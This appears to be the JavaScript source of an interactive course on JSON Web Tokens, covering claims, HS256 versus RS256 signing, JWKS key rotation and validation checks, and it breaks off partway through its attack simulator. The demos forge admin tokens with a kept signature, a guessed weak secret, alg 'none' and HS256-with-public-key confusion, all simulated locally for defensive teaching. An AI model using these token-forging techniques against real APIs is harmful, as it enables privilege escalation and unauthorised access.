window.LESSONS = window.LESSONS || [];
(function () {
  // Shared widget styles + helpers (concatenated into each widget's code).
  const CSS = `<style>
.card { border: 1px solid #e2e5ee; border-radius: 10px; padding: 9px 12px; background: #fff; margin-bottom: 9px; }
.card h4 { margin: 0 0 6px; font-size: 13.5px; }
.row { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin-bottom: 7px; }
.g2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
.g3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
label { font-size: 12.5px; color: #4a5165; }
input, select, textarea { font: 12.5px ui-monospace, Menlo, monospace; }
textarea { width: 100%; box-sizing: border-box; resize: vertical; }
.mono { font: 12.5px/1.5 ui-monospace, Menlo, monospace; overflow-wrap: anywhere; }
pre.dark { background: #0f1320; color: #d7dcea; padding: 8px 10px; border-radius: 8px; margin: 4px 0;
  font: 12px/1.5 ui-monospace, Menlo, monospace; white-space: pre-wrap; overflow-wrap: anywhere; }
.ok { color: #15803d; font-weight: 600; }
.bad { color: #b91c1c; font-weight: 600; }
.mut { color: #6b7280; font-size: 12.5px; }
.pill { display: inline-block; padding: 1px 8px; border-radius: 99px; font-size: 12px; font-weight: 600; }
.pill.ok { background: #dcfce7; } .pill.bad { background: #fee2e2; } .pill.mid { background: #fef3c7; color: #92400e; }
.verdict { font-size: 17px; font-weight: 800; padding: 6px 10px; border-radius: 8px; text-align: center; margin-top: 6px; }
.verdict.ok { background: #dcfce7; } .verdict.bad { background: #fee2e2; color: #b91c1c; }
table.t { border-collapse: collapse; width: 100%; font-size: 12.5px; }
table.t td, table.t th { border: 1px solid #e2e5ee; padding: 3px 6px; text-align: left; vertical-align: top; }
table.t th { background: #f4f6fa; }
ol.trace { margin: 4px 0; padding-left: 22px; font-size: 13px; }
ol.trace li { margin: 3px 0; }
.fb { margin-top: 8px; padding: 8px 10px; border-radius: 8px; font-size: 13.5px; }
.fb.ok { background: #dcfce7; } .fb.bad { background: #fee2e2; }
.fb:empty { display: none; }
mark { background: #fde68a; border-radius: 3px; padding: 0 2px; }
.jh { color: #e11d48; } .jp { color: #9333ea; } .js { color: #0284c7; } .jx { color: #ca8a04; } .jy { color: #059669; }
.jh, .jp, .js, .jx, .jy { overflow-wrap: anywhere; word-break: break-all; }
</style>`;
  const H = `const NL = '\\n';
const $ = (s) => document.querySelector(s);
const esc = (s) => Seq.esc(s);
const NOW = Math.floor(Date.now() / 1000);
const iso = (t) => new Date(t * 1000).toISOString().replace('.000', '');
function colorJwt(t) {
  const cls = ['jh', 'jp', 'js', 'jx', 'jy'];
  return String(t).split('.').map((x, i) => '<span class="' + cls[i] + '">' + esc(x) + '</span>').join('<b>.</b>');
}
function rsSign(input, kid) {
  // SIMULATED RS256: stands in for RSA(private key) so the demo has no real RSA.
  const out = [];
  for (let i = 0; i < 8; i++) out.push.apply(out, Array.from(Auth.sha256('IDP-PRIVATE-KEY|' + (kid || '') + '|' + i + '|' + input)));
  return Auth.b64url(new Uint8Array(out));
}
function mk(header, payload, sigFn) {
  const h = Auth.b64url(JSON.stringify(header)), p = Auth.b64url(JSON.stringify(payload));
  return h + '.' + p + '.' + sigFn(h + '.' + p);
}
function dec(t) {
  const parts = String(t).trim().split('.');
  return { header: JSON.parse(Auth.b64urlDecode(parts[0])), payload: JSON.parse(Auth.b64urlDecode(parts[1])), sig: parts[2] || '', input: parts[0] + '.' + parts[1] };
}
`;

  // =====================================================================
  // jwt-anatomy
  // =====================================================================
  const jwtLab = CSS + `
<div class="g2">
  <div class="card">
    <h4>① Edit header &amp; payload (JSON)</h4>
    <label>Header</label><textarea id="hd" rows="2"></textarea>
    <label>Payload (claims)</label><textarea id="pl" rows="10"></textarea>
    <div class="row" style="margin-top:4px">
      <label>HS256 secret <input id="sec" value="my-256-bit-demo-secret" size="22"></label>
    </div>
    <div class="row">
      <button id="b1">iat = now</button><button id="b2">exp = now + 15 min</button><button id="b3">exp = 1 h ago</button>
    </div>
    <div id="jerr" class="bad"></div>
  </div>
  <div class="card">
    <h4>② The token (editable: paste any JWT)</h4>
    <div class="mono" id="col" style="padding:6px;background:#fafbff;border-radius:8px;font-size:12px;min-height:60px"></div>
    <textarea id="tok" rows="3" style="margin-top:4px;font-size:11px"></textarea>
    <div id="vf" style="margin:4px 0"></div>
    <table class="t" id="claims"></table>
  </div>
</div>
<script>
` + H + `
const DESC = { iss: 'Issuer: who created and signed it', sub: 'Subject: who the token is about (user id)', aud: 'Audience: who it is meant for (which API)',
  exp: 'Expiration: reject after this time', nbf: 'Not before: reject before this time', iat: 'Issued at', jti: 'JWT ID: unique id (for denylists / replay)' };
$('#hd').value = JSON.stringify({ alg: 'HS256', typ: 'JWT' });
$('#pl').value = JSON.stringify({ iss: 'https://idp.shop.test', sub: 'user_42', aud: 'https://api.shop.test', iat: NOW, nbf: NOW, exp: NOW + 900,
  jti: 'b7f2c1e0-4d1a-4f0e-9a51-3c2b8f6d9e10', name: 'Alice', scope: 'orders:read' }, null, 2);
function encode() {
  try {
    const h = JSON.parse($('#hd').value), p = JSON.parse($('#pl').value);
    $('#jerr').textContent = '';
    $('#tok').value = Auth.jwtSign(h, p, $('#sec').value);
    show();
  } catch (e) { $('#jerr').textContent = 'JSON error: ' + e.message; }
}
function show() {
  const t = $('#tok').value.trim();
  $('#col').innerHTML = colorJwt(t) + '<div class="mut" style="margin-top:4px"><span class="jh">header</span> . <span class="jp">payload</span> . <span class="js">signature</span> · ' + t.length + ' chars</div>';
  try {
    const d = dec(t);
    const ok = Auth.jwtVerify(t, $('#sec').value);
    $('#vf').innerHTML = d.header.alg === 'HS256' ? (ok ? '<span class="pill ok">✓ signature valid for this secret</span>' : '<span class="pill bad">✗ signature does NOT match this secret</span>')
      : '<span class="pill mid">alg ' + esc(d.header.alg) + ': cannot verify with an HS256 secret</span>';
    $('#claims').innerHTML = '<tr><th>claim</th><th>value</th><th>meaning</th></tr>' + Object.keys(d.payload).map((k) => {
      const v = d.payload[k];
      let shown = esc(JSON.stringify(v));
      if (['exp', 'nbf', 'iat'].includes(k) && typeof v === 'number') {
        const rel = v - NOW;
        shown += '<br><span class="mut">' + iso(v) + ' (' + (rel >= 0 ? 'in ' + rel : -rel + ' s ago') + (rel >= 0 ? ' s' : '') + ')</span>';
        if (k === 'exp' && rel < 0) shown += ' <span class="pill bad">expired</span>';
      }
      return '<tr><td><b>' + esc(k) + '</b></td><td class="mono">' + shown + '</td><td>' + (DESC[k] || '<span class="mut">private claim (your app\\'s own)</span>') + '</td></tr>';
    }).join('');
  } catch (e) {
    $('#vf').innerHTML = '<span class="pill bad">cannot decode: ' + esc(e.message) + '</span>';
    $('#claims').innerHTML = '';
  }
}
const setClaim = (k, v) => { try { const p = JSON.parse($('#pl').value); p[k] = v; $('#pl').value = JSON.stringify(p, null, 2); encode(); } catch (e) {} };
$('#b1').onclick = () => setClaim('iat', NOW);
$('#b2').onclick = () => setClaim('exp', NOW + 900);
$('#b3').onclick = () => setClaim('exp', NOW - 3600);
['#hd', '#pl', '#sec'].forEach((s) => $(s).addEventListener('input', encode));
$('#tok').addEventListener('input', show);
encode();
</script>`;

  const signedNotEncrypted = CSS + `
<div class="g2">
  <div class="card">
    <h4>Anyone can READ a JWS</h4>
    <div class="mono" id="t0" style="font-size:11.5px"></div>
    <pre class="dark" id="rd"></pre>
    <div class="mut">Just Base64url-decode the middle part. No key needed. So never put secrets (passwords, card numbers) in a JWT payload.</div>
  </div>
  <div class="card">
    <h4>Nobody can CHANGE it without the key</h4>
    <div class="row"><label><input type="checkbox" id="weak"> server uses a weak secret <code>secret</code></label></div>
    <button id="a1">🦹 Edit payload role → admin (keep old signature)</button>
    <button id="a2">🦹 Edit + re-sign with guessed secret "secret"</button>
    <div class="mono" id="t1" style="font-size:11.5px;margin-top:6px"></div>
    <div id="vd"></div>
  </div>
</div>
<div class="card">
  <h4>JWS (signed, 3 parts) vs JWE (encrypted, 5 parts)</h4>
  <div class="mono" style="font-size:12px">JWS: <span class="jh">header</span>.<span class="jp">payload</span>.<span class="js">signature</span>  ← readable by all, tamper-evident (RFC 7515)<br>
  JWE: <span class="jh">protected header</span>.<span class="jx">encrypted key</span>.<span class="jy">IV</span>.<span class="jp">ciphertext</span>.<span class="js">auth tag</span>  ← only the key holder can read (RFC 7516)</div>
  <div class="mut">Almost every "JWT" you will meet (access tokens, ID tokens) is a JWS. JWE is used when the payload itself must stay confidential, e.g. some ID tokens sent through the browser.</div>
</div>
<script>
` + H + `
const payload = { sub: 'user_42', email: 'alice@example.com', role: 'user', exp: NOW + 900 };
const strong = 'k7#Qv9!xR2mZ8pL4wT6yB1nH5cJ3fD0s';
const key = () => ($('#weak').checked ? 'secret' : strong);
let tok;
function base() {
  tok = Auth.jwtSign({ alg: 'HS256', typ: 'JWT' }, payload, key());
  $('#t0').innerHTML = colorJwt(tok);
  const mid = tok.split('.')[1];
  $('#rd').textContent = '$ echo ' + mid.slice(0, 24) + '… | base64 -d' + NL + Auth.b64urlDecode(mid);
  $('#t1').innerHTML = ''; $('#vd').innerHTML = '';
}
function serverCheck(t, how) {
  const ok = Auth.jwtVerify(t, key());
  $('#t1').innerHTML = how + '<br>' + colorJwt(t);
  $('#vd').innerHTML = '<div class="verdict ' + (ok ? 'bad' : 'ok') + '">' + (ok ? '😱 Server ACCEPTS: attacker is admin' : '🛡 Server REJECTS: signature mismatch') + '</div>' +
    (ok ? '<div class="mut">A short guessable HS256 secret can be brute-forced offline from one captured token (hashcat mode 16500). Use ≥ 256 random bits.</div>' : '');
}
$('#a1').onclick = () => {
  const p = tok.split('.');
  const evil = Auth.b64url(JSON.stringify(Object.assign({}, payload, { role: 'admin' })));
  serverCheck(p[0] + '.' + evil + '.' + p[2], 'payload replaced, signature copied from the original:');
};
$('#a2').onclick = () => serverCheck(Auth.jwtSign({ alg: 'HS256', typ: 'JWT' }, Object.assign({}, payload, { role: 'admin' }), 'secret'), 'payload changed and signed with HMAC key "secret":');
$('#weak').onchange = base;
base();
</script>`;

  const anatomyExercise = (solved) => CSS + `
<div class="card">
  <h4>Craft a token the Orders API will accept</h4>
  <div class="mut">Requirements: <code>alg</code> HS256 · <code>iss</code> = <code>https://idp.shop.test</code> · <code>sub</code> = <code>alice</code> ·
    <code>aud</code> = <code>https://api.shop.test</code> · <code>iat</code> = now · <code>exp</code> in the future but at most 1 hour away (seconds since 1970!).
    Now is <b id="now"></b>. The widget signs with the shared secret for you.</div>
  <div class="g2" style="margin-top:6px">
    <div><label>Header</label><textarea id="hd" rows="2">{"alg":"HS256","typ":"JWT"}</textarea>
      <label>Payload</label><textarea id="pl" rows="8">${solved ? '@@SOL' : '{\n  "iss": "https://idp.shop.test",\n  "sub": "alice",\n  "iat": 1793448000,\n  "exp": 1793448900000\n}'}</textarea>
      <button id="chk">Check</button></div>
    <div><label>Signed token</label><div class="mono" id="out" style="font-size:11.5px"></div><div id="fb" class="fb"></div></div>
  </div>
</div>
<script>
` + H + `
$('#now').textContent = NOW + ' (' + iso(NOW) + ')';
if ($('#pl').value === '@@SOL') $('#pl').value = JSON.stringify({ iss: 'https://idp.shop.test', sub: 'alice', aud: 'https://api.shop.test', iat: NOW, exp: NOW + 900 }, null, 2);
$('#chk').onclick = () => {
  const fb = $('#fb'), errs = [];
  let h, p;
  try { h = JSON.parse($('#hd').value); p = JSON.parse($('#pl').value); }
  catch (e) { fb.className = 'fb bad'; fb.textContent = '❌ Invalid JSON: ' + e.message; return; }
  const t = Auth.jwtSign(h, p, 'orders-api-shared-secret');
  $('#out').innerHTML = colorJwt(t);
  if (h.alg !== 'HS256') errs.push('header alg must be "HS256"');
  if (p.iss !== 'https://idp.shop.test') errs.push('iss must be exactly "https://idp.shop.test"');
  if (p.sub !== 'alice') errs.push('sub must be "alice"');
  const aud = Array.isArray(p.aud) ? p.aud : [p.aud];
  if (!aud.includes('https://api.shop.test')) errs.push('aud must be (or contain) "https://api.shop.test"');
  if (typeof p.iat !== 'number' || Math.abs(p.iat - NOW) > 120) errs.push('iat must be about now (' + NOW + ')');
  if (typeof p.exp !== 'number') errs.push('exp must be a number (NumericDate)');
  else if (p.exp > 1e11) errs.push('exp looks like MILLISECONDS. JWT times are seconds since 1970');
  else if (p.exp <= NOW) errs.push('exp is in the past');
  else if (p.exp > NOW + 3600) errs.push('exp is more than 1 hour away');
  fb.className = 'fb ' + (errs.length ? 'bad' : 'ok');
  fb.innerHTML = errs.length ? '❌ ' + errs.join('<br>❌ ') : '✅ The API would accept this token: right issuer, right audience, valid time window.';
};
</script>`;

  // =====================================================================
  // jwt-signing
  // =====================================================================
  const hsVsRs = CSS + `
<div class="mono" style="font-size:12px;margin-bottom:6px">signing input = base64url(header) + "." + base64url(payload) = <span id="si"></span></div>
<div class="g2">
  <div class="card">
    <h4>🔑 HS256: one shared secret</h4>
    <label>secret (known to IdP AND every API)</label><input id="sec" value="shared-secret-2026-k9Lq" style="width:100%;box-sizing:border-box">
    <pre class="dark" id="hs"></pre>
    <table class="t"><tr><th>Who has the secret</th><th>Can verify</th><th>Can mint tokens</th></tr>
      <tr><td>IdP</td><td>✅</td><td>✅</td></tr><tr><td>Orders API</td><td>✅</td><td class="bad">✅ (!)</td></tr><tr><td>Billing API</td><td>✅</td><td class="bad">✅ (!)</td></tr></table>
    <button id="hm">🦹 Hacked Billing API mints {"role":"admin"}</button>
    <div id="hsr"></div>
  </div>
  <div class="card">
    <h4>🗝 RS256 idea: private key signs, public key verifies</h4>
    <div class="mut">Toy RSA with tiny numbers (real RS256 uses 2048-bit n; ES256 uses an elliptic curve). Same math, computed live with BigInt.</div>
    <div class="mono" style="font-size:12px">p=61, q=53 → n = 3233 · public e = 17 · <span class="bad">private d = 2753</span> (IdP only)</div>
    <pre class="dark" id="rs"></pre>
    <button id="rm">🦹 Hacked Billing API tries to mint (has only n, e)</button>
    <div id="rsr"></div>
  </div>
</div>
<script>
` + H + `
const n = 3233n, e = 17n, d = 2753n;
function modpow(b, x, m) { let r = 1n; b %= m; while (x > 0n) { if (x & 1n) r = (r * b) % m; b = (b * b) % m; x >>= 1n; } return r; }
const hnum = (s) => BigInt('0x' + Auth.sha256hex(s)) % n;
const P = { sub: 'user_42', role: 'user', exp: NOW + 900 };
function input(header, payload) { return Auth.b64url(JSON.stringify(header)) + '.' + Auth.b64url(JSON.stringify(payload)); }
function render() {
  const inp = input({ alg: 'HS256', typ: 'JWT' }, P);
  $('#si').textContent = inp.slice(0, 50) + '…';
  $('#hs').textContent = 'HMAC-SHA256(secret, input)' + NL + '= ' + Auth.hmacSha256b64url($('#sec').value, inp) + NL + NL + 'verify: recompute with the same secret, compare';
  const rin = input({ alg: 'RS256', typ: 'JWT', kid: 'toy' }, P);
  const h = hnum(rin), s = modpow(h, d, n), back = modpow(s, e, n);
  $('#rs').textContent = 'h = sha256(input) mod n           = ' + h + NL + 'sign:   s = h^d mod n  (private)   = ' + s + NL + 'verify: s^e mod n      (public)    = ' + back + (back === h ? '  = h ✓' : '  ≠ h ✗');
}
$('#hm').onclick = () => {
  const evil = Object.assign({}, P, { role: 'admin' });
  const t = Auth.jwtSign({ alg: 'HS256', typ: 'JWT' }, evil, $('#sec').value);
  const ok = Auth.jwtVerify(t, $('#sec').value);
  $('#hsr').innerHTML = '<div class="verdict ' + (ok ? 'bad' : 'ok') + '">Orders API: ' + (ok ? 'ACCEPTS the forged admin token 😱' : 'rejects') + '</div><div class="mut">With a shared secret, every verifier is also a potential issuer. Fine for one service verifying its own tokens; risky across many services.</div>';
};
$('#rm').onclick = () => {
  const evil = Object.assign({}, P, { role: 'admin' });
  const rin = input({ alg: 'RS256', typ: 'JWT', kid: 'toy' }, evil);
  const h = hnum(rin);
  const guess = modpow(h, e, n); // best it can do without d
  const back = modpow(guess, e, n);
  $('#rsr').innerHTML = '<pre class="dark">h(admin token) = ' + h + NL + 'attacker "signs" with e: s = h^e mod n = ' + guess + NL + 'Orders API verifies: s^e mod n = ' + back + (back === h ? ' = h' : ' ≠ h ✗') + '</pre>' +
    '<div class="verdict ' + (back === h ? 'bad' : 'ok') + '">Orders API: ' + (back === h ? 'accepts' : 'REJECTS: only the holder of d can sign') + '</div>';
};
$('#sec').addEventListener('input', render);
render();
</script>`;

  const jwksFlow = CSS + `
<div id="flow"></div>
<script>
` + H + `
function fakeN(seed) { const out = []; for (let i = 0; i < 8; i++) out.push.apply(out, Array.from(Auth.sha256(seed + i))); out[0] |= 0x80; return Auth.b64url(new Uint8Array(out)); }
const K1 = { kty: 'RSA', use: 'sig', alg: 'RS256', kid: '2026-07-rsa', n: fakeN('k1'), e: 'AQAB' };
const K2 = { kty: 'RSA', use: 'sig', alg: 'RS256', kid: '2026-10-rsa', n: fakeN('k2'), e: 'AQAB' };
const jwksMsg = (keys) => ['HTTP/1.1 200 OK', 'Content-Type: application/json', 'Cache-Control: public, max-age=3600', '', JSON.stringify({ keys: keys }, null, 2)].join(NL);
const P = { iss: 'https://idp.shop.test', sub: 'user_42', aud: 'https://api.shop.test', scope: 'orders:read', iat: NOW, exp: NOW + 900 };
const t1 = mk({ alg: 'RS256', typ: 'at+jwt', kid: K1.kid }, P, (i) => rsSign(i, K1.kid));
const t2 = mk({ alg: 'RS256', typ: 'at+jwt', kid: K2.kid }, P, (i) => rsSign(i, K2.kid));
const tE = mk({ alg: 'RS256', typ: 'at+jwt', kid: 'attacker-key' }, Object.assign({}, P, { scope: 'admin' }), (i) => rsSign(i, 'evil'));
const call = (t) => ['GET /orders HTTP/1.1', 'Host: api.shop.test', 'Authorization: Bearer ' + t.slice(0, 40) + '…', '', '# decoded header: ' + JSON.stringify(dec(t).header)].join(NL);
const fetchJwks = { from: 'a', to: 'i', kind: 'back', label: 'GET /.well-known/jwks.json', msg: ['GET /.well-known/jwks.json HTTP/1.1', 'Host: idp.shop.test', 'Accept: application/json', '', '# URL comes from the IdP discovery doc: jwks_uri', '# (never from the token itself: ignore jku / x5u headers)'].join(NL) };
const verify = (t, k) => ({ from: 'a', to: 'a', label: 'pick key kid=' + k.kid + ' → verify RS256', badge: 'Verify',
  msg: ['header.kid = "' + dec(t).header.kid + '"  → key found in cache', 'RS256 verify(signature, input, n,e of ' + k.kid + ')  ✓ (simulated)', 'iss ✓  aud ✓  exp ✓ (' + 900 + ' s left)'].join(NL),
  note: 'The <code>kid</code> (key ID) in the header just says which key to try. The <b>alg</b> comes from the server config / JWK (RS256), not blindly from the token.' });
const ok = { from: 'a', to: 'c', kind: 'res', label: '200 OK', msg: ['HTTP/1.1 200 OK', 'Content-Type: application/json', '', '[{"id":101}]'].join(NL) };
const ACT = [
  { id: 'c', label: 'App', icon: '📱', store: {} , storeLabel: 'App'},
  { id: 'a', label: 'Orders API', icon: '🛒', store: {}, storeLabel: 'API JWKS cache' },
  { id: 'i', label: 'idp.shop.test', icon: '🔑', store: { signing: K1.kid + ' (private)', published: K1.kid }, storeLabel: 'IdP keys' },
];
Seq.mount('#flow', {
  title: 'Asymmetric JWTs: JWKS discovery, kid lookup and key rotation',
  actors: ACT,
  scenarios: [
    { name: '✅ Cold cache → fetch JWKS', steps: [
      { from: 'c', to: 'a', label: 'GET /orders  Bearer (kid=2026-07-rsa)', msg: call(t1), hl: ['kid'] },
      { from: 'a', to: 'a', label: 'kid 2026-07-rsa not in cache', note: 'The API has never fetched the IdP\\'s public keys.' },
      fetchJwks,
      { from: 'i', to: 'a', kind: 'back', label: 'JWKS { keys: [2026-07-rsa] }', msg: jwksMsg([K1]), hl: ['"kid"', '"n"', '"e"'],
        note: 'A JWK Set (RFC 7517). For RSA: <code>n</code> (modulus) and <code>e</code> (exponent, <code>AQAB</code> = 65537). These are <b>public</b>; publishing them is safe.',
        set: { a: { [K1.kid]: 'RSA public key, cached 1h' } } },
      verify(t1, K1), ok,
      { from: 'c', to: 'a', label: 'next request (same kid)', msg: call(t1) },
      { from: 'a', to: 'a', label: 'cache hit → verify locally', note: 'No network call: this is why JWTs scale well.' },
      ok,
    ]},
    { name: '🔄 Key rotation', steps: [
      { from: 'i', to: 'i', label: 'generate 2026-10-rsa, PUBLISH only', badge: 'Phase 1', note: 'Step 1 of a safe rotation: add the new public key to the JWKS but keep signing with the old one.',
        set: { i: { published: K1.kid + ', ' + K2.kid } } },
      { from: 'a', to: 'i', kind: 'back', label: 'cache expires → refetch JWKS', msg: fetchJwks.msg },
      { from: 'i', to: 'a', kind: 'back', label: 'JWKS { keys: [2026-07, 2026-10] }', msg: jwksMsg([K1, K2]), set: { a: { [K2.kid]: 'RSA public key, cached 1h' } },
        note: 'Every API now knows both keys before any token uses the new one.' },
      { from: 'i', to: 'i', label: 'start signing with 2026-10-rsa', badge: 'Phase 2', set: { i: { signing: K2.kid + ' (private)' } } },
      { from: 'c', to: 'a', label: 'new token (kid=2026-10-rsa)', msg: call(t2), hl: ['2026-10-rsa'] },
      verify(t2, K2), ok,
      { from: 'c', to: 'a', label: 'older token (kid=2026-07-rsa) still in use', msg: call(t1), hl: ['2026-07-rsa'] },
      verify(t1, K1), ok,
      { from: 'i', to: 'i', label: 'after max token lifetime: unpublish 2026-07', badge: 'Phase 3',
        note: 'Only once every token signed with the old key has expired is it removed from the JWKS.', set: { i: { published: K2.kid } } },
    ]},
    { name: '❌ Unknown kid', steps: [
      { from: 'c', to: 'a', label: 'GET /orders  Bearer (kid=attacker-key)', msg: call(tE), hl: ['attacker-key'],
        note: 'An attacker forged a token with their own key and an invented kid.' },
      { from: 'a', to: 'a', label: 'kid not in cache', set: { a: { [K1.kid]: 'RSA public key, cached 1h' } } },
      Object.assign({}, fetchJwks, { label: 'refetch JWKS once (rate-limited)', note: 'An unknown kid might mean a rotation happened, so refetch, but at most e.g. once per minute, or attackers could use random kids to make you hammer the IdP.' }),
      { from: 'i', to: 'a', kind: 'back', label: 'JWKS (no such kid)', msg: jwksMsg([K1]) },
      { from: 'a', to: 'c', kind: 'err', label: '401 invalid_token', msg: ['HTTP/1.1 401 Unauthorized', 'WWW-Authenticate: Bearer error="invalid_token",', '    error_description="unknown signing key"'].join(NL),
        note: 'Keys come only from the trusted IdP\\'s JWKS. A token cannot bring its own key.' },
    ]},
  ],
});
</script>`;

  const rotationExercise = (solved) => CSS + `
<div class="card">
  <h4>Put the key-rotation steps in a safe order (1 = first)</h4>
  <table class="t" id="tb"></table>
  <button id="chk" style="margin-top:6px">Check</button>
  <div id="fb" class="fb"></div>
</div>
<script>
` + H + `
const STEPS = [
  ['Start signing new tokens with the new kid', 3],
  ['Remove the old public key from the JWKS', 5],
  ['Generate a new key pair and add its public key to the JWKS', 1],
  ['Wait at least the max lifetime of tokens signed with the old key', 4],
  ['Wait at least the JWKS cache time (max-age) so every API has the new key', 2],
];
const PRE = ` + (solved ? '[3,5,1,4,2]' : '[0,0,0,0,0]') + `;
$('#tb').innerHTML = '<tr><th>Step</th><th>Order</th></tr>' + STEPS.map((s, i) => '<tr><td>' + s[0] + '</td><td><select id="o' + i + '">' +
  [0, 1, 2, 3, 4, 5].map((k) => '<option value="' + k + '"' + (PRE[i] === k ? ' selected' : '') + '>' + (k || '–') + '</option>').join('') + '</select></td></tr>').join('');
$('#chk').onclick = () => {
  const pos = STEPS.map((s, i) => +$('#o' + i).value);
  const fb = $('#fb');
  if (new Set(pos).size !== 5 || pos.includes(0)) { fb.className = 'fb bad'; fb.textContent = '❌ Use each number 1–5 exactly once.'; return; }
  const at = (idx) => pos[idx];
  const issues = [];
  if (at(0) < at(4) || at(0) < at(2)) issues.push('Signing with the new key before every API has it → APIs with an old cache reject new tokens (or hammer the IdP).');
  if (at(1) < at(3)) issues.push('Removing the old key before old tokens expire → users with still-valid tokens suddenly get 401.');
  if (at(4) < at(2)) issues.push('Waiting for caches only makes sense after publishing the new key.');
  if (at(3) < at(0)) issues.push('Old tokens keep being issued until you switch signing keys, so the lifetime wait starts after step "start signing".');
  const ok = pos.every((p, i) => p === STEPS[i][1]);
  fb.className = 'fb ' + (ok ? 'ok' : 'bad');
  fb.innerHTML = ok ? '✅ Publish → wait for caches → switch signing → wait for old tokens to expire → unpublish. Zero failed requests.' : '❌ ' + (issues.length ? issues.join('<br>❌ ') : 'Not the safe order yet.');
};
</script>`;

  // =====================================================================
  // jwt-validation
  // =====================================================================
  const TOKENS_JS = `
const ISS = 'https://idp.shop.test', AUD = 'https://api.shop.test';
const PUB = '-----BEGIN PUBLIC KEY-----' + NL + 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozMxH2Mo' + NL +
  '4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u' + NL + '+qKhbwKfBstIs+bMY2Zkp18gnTxKLxoS2tFczGkPLPgizskuemMghRniWaoLcyeh' + NL +
  'kd3qqGElvW/VDL5AaWTg0nLVkjRo9z+40RQzuVaE8AkAFmxZzow3x+VJYKdjykkJ' + NL + '0iT9wCS0DRTXu269V264Vf/3jvredZiKRkgwlL9xNAwxXFg0x/XFw005UWVRIkdg' + NL +
  'cKWTjpBP2dPwVZ4WWC+9aGVd+Gyn1o0CLelf4rEjGoXbAAEgAqeGUxrcIlbjXfbc' + NL + 'mwIDAQAB' + NL + '-----END PUBLIC KEY-----';
const BASE = { iss: ISS, sub: 'alice', aud: AUD, role: 'user', iat: NOW - 60, nbf: NOW - 60, exp: NOW + 840 };
const RS = (h, p) => mk(Object.assign({ alg: 'RS256', typ: 'JWT', kid: '2026-10-rsa' }, h), Object.assign({}, BASE, p), (i) => rsSign(i, '2026-10-rsa'));
const good = RS({}, {});
const gp = good.split('.');
const TOKENS = {
  valid: { name: '✅ Legit token from the IdP', t: good },
  none: { name: '🦹 alg: none (no signature)', t: Auth.b64url(JSON.stringify({ alg: 'none', typ: 'JWT' })) + '.' + Auth.b64url(JSON.stringify(Object.assign({}, BASE, { role: 'admin' }))) + '.' },
  tamper: { name: '🦹 payload edited, old signature', t: gp[0] + '.' + Auth.b64url(JSON.stringify(Object.assign({}, BASE, { role: 'admin' }))) + '.' + gp[2] },
  confusion: { name: '🦹 alg confusion: HS256 signed with the PUBLIC key', t: Auth.jwtSign({ alg: 'HS256', typ: 'JWT', kid: '2026-10-rsa' }, Object.assign({}, BASE, { role: 'admin' }), PUB) },
  expired: { name: '⏰ expired (exp 10 min ago)', t: RS({}, { iat: NOW - 1500, nbf: NOW - 1500, exp: NOW - 600 }) },
  nbf: { name: '⏳ not yet valid (nbf in 1 h)', t: RS({}, { nbf: NOW + 3600, exp: NOW + 4500 }) },
  aud: { name: '🎯 meant for another API (aud = billing)', t: RS({}, { aud: 'https://billing.shop.test' }) },
  iss: { name: '🏷 wrong issuer (staging IdP reusing the key)', t: RS({}, { iss: 'https://staging-idp.shop.test' }) },
};
// Validates like a JWT library. cfg = which checks are ON.
function validate(token, cfg) {
  const st = [];
  let fail = null;
  const add = (key, ok, text, on) => { st.push({ key, ok, text, on: on !== false }); if (on !== false && !ok && !fail) fail = key; };
  let d;
  try { d = dec(token); add('parse', true, 'parse 3 parts, base64url-decode header + payload'); }
  catch (e) { add('parse', false, 'parse: ' + e.message); return { st, fail, d: null }; }
  const alg = d.header.alg;
  if (cfg.pin) add('alg', alg === 'RS256', 'alg allow-list [RS256]: header says "' + alg + '"');
  else add('alg', true, 'alg allow-list: OFF → trusts header alg "' + alg + '" ⚠', true);
  if (!cfg.sig) add('sig', true, 'signature: NOT VERIFIED (decode() instead of verify()) ⚠');
  else if (alg === 'none') add('sig', true, 'signature: alg none → library skips verification ⚠');
  else if (alg === 'HS256') {
    const exp = Auth.hmacSha256b64url(PUB, d.input);
    add('sig', exp === d.sig, 'signature: HMAC-SHA256(key = configured PUBLIC KEY PEM, input) ' + (exp === d.sig ? 'matches ⚠' : 'mismatch'));
  } else {
    const exp = rsSign(d.input, d.header.kid);
    add('sig', exp === d.sig, 'signature: RS256 with JWKS key ' + d.header.kid + ' ' + (exp === d.sig ? '✓' : 'mismatch'));
  }
  const p = d.payload;
  add('exp', !(p.exp <= NOW), 'exp ' + p.exp + (p.exp <= NOW ? ' ≤ now (expired ' + (NOW - p.exp) + ' s ago)' : ' > now'), cfg.exp);
  add('nbf', !(p.nbf > NOW), 'nbf ' + p.nbf + (p.nbf > NOW ? ' > now (not yet valid)' : ' ≤ now'), cfg.nbf);
  add('iss', p.iss === ISS, 'iss "' + p.iss + '" ' + (p.iss === ISS ? '=' : '≠') + ' "' + ISS + '"', cfg.iss);
  const auds = [].concat(p.aud);
  add('aud', auds.includes(AUD), 'aud ' + JSON.stringify(p.aud) + (auds.includes(AUD) ? ' contains ' : ' does not contain ') + '"' + AUD + '"', cfg.aud);
  return { st, fail, d };
}`;

  const attackSim = CSS + `
<div class="g2">
  <div class="card">
    <h4>① Incoming token</h4>
    <select id="tk" style="width:100%"></select>
    <div class="mono" id="col" style="font-size:11px;margin-top:6px;max-height:90px;overflow:auto"></div>
    <pre class="dark" id="dc" style="max-height:200px;overflow:auto"></pre>
    <h4>② Checks the API performs</h4>
    <div id="cfg"></div>
    <div class="row"><button id="all">All on (secure)</button><button id="naive">Naive library defaults</button></div>
  </div>
  <div class="card">
    <h4>③ Validation trace</h4>
    <ol class="trace mono" id="tr" style="font-size:12px"></ol>
    <div id="vd"></div>
    <div class="mut" id="why" style="margin-top:6px"></div>
  </div>
</div>
<script>
` + H + TOKENS_JS + `
const CHECKS = [['pin', 'pin algorithm (only RS256)'], ['sig', 'verify signature'], ['exp', 'check exp'], ['nbf', 'check nbf'], ['iss', 'check iss'], ['aud', 'check aud']];
$('#cfg').innerHTML = CHECKS.map((c) => '<label style="display:inline-block;width:48%"><input type="checkbox" id="c_' + c[0] + '" checked> ' + c[1] + '</label>').join('');
